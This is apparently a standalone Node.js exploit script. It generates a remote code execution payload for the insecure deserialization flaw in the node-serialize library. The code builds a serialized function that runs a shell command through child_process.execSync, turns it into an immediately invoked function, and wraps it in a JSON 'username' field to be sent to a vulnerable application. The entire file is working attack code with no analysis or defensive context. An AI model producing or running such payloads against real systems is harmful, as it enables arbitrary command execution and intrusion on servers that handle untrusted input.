var serialize = require('node-serialize');

var y = {
	rce : (()=>{throw require('child_process').execSync('id')}),
}
var temp = serialize.serialize(y);

var idx1 = temp.indexOf("$ND_FUNC$$_") + 11;
var idx2 = temp.indexOf("}\"}");

temp = temp.slice(0, idx1) + "(" + temp.slice(idx1, idx2 + 1) + ")()" + temp.slice(idx2 + 1);

var payload = "{\"username\":" + temp + "}";
console.log(payload);